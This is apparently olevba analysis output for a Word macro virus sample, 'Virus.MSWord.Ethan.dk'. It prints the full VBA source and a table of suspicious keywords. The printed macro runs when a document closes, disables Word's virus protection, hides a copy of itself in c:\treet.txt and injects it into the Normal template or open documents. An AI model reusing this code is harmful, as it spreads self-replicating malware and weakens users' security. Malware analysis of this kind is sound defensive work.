olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.dk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Rem Ñâîþ ìàøèíó íàäî çàùèùàòü êàê ñåáÿ
Rem Âèðóñû íå äîëæåí ïðè÷èíÿòü âðåäà, îí äîëæåí ïðåäóïðåæäàòü
Rem âðåä è ó÷èòü ïîëüçîâàòåëÿ ýñòåòèêè ðàáîòû ñ ÏÊ !!!
Rem dr.DEA    (c) 1999 OÌÑÊ

On Error Resume Next
saveddocs00 = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options:
    .ConfirmConversions = 0:
    .SaveNormalPrompt = 0:
    .VirusProtection = 0:
End With

If Dir("c:\treet.txt", 6) = "" Then
    Open "c:\treet.txt" For Output As #1

    For Iridium = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Iridium, 1)
    Next Iridium
    Close #1
    SetAttr "c:\treet.txt", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
        Set pathstrint = NormalTemplate.VBProject.VBComponents.Item(1)
    ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
        Set pathstrint = ActiveDocument.VBProject.VBComponents.Item(1)
    Else
        pathstrint = ""
End If

If pathstrint <> "" Then Open "c:\treet.txt" For Input As #1

If LOF(1) = 0 Then GoTo quit
counter = 1
Do While Not EOF(1)
    Line Input #1, absolute
    pathstrint.CodeModule.Insertlines (counter), absolute
    counter = counter + 1
Loop
quit: Close #1

If Rnd < 0.1 Then MsgBox "ß âèðóñ DEAmac V1.0, ñêîðî âàøà èíôîðìàöèÿ áóäåò áåçâîçâðàòíî ïîòåðÿíà               Àíòèâèðóñ âàñ íå ñïàñåò ó ìåíÿ ýïèáðèðîâàííîå ÿäðî ÕÀ-ÕÀ-ÕÀ !!!", vbCritical, "Íàéäåí îïàñíûé âèðóñ !!!"
If ActiveDocument.Saved <> saveddocs00 Then ActiveDocument.Saved = saveddocs00
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

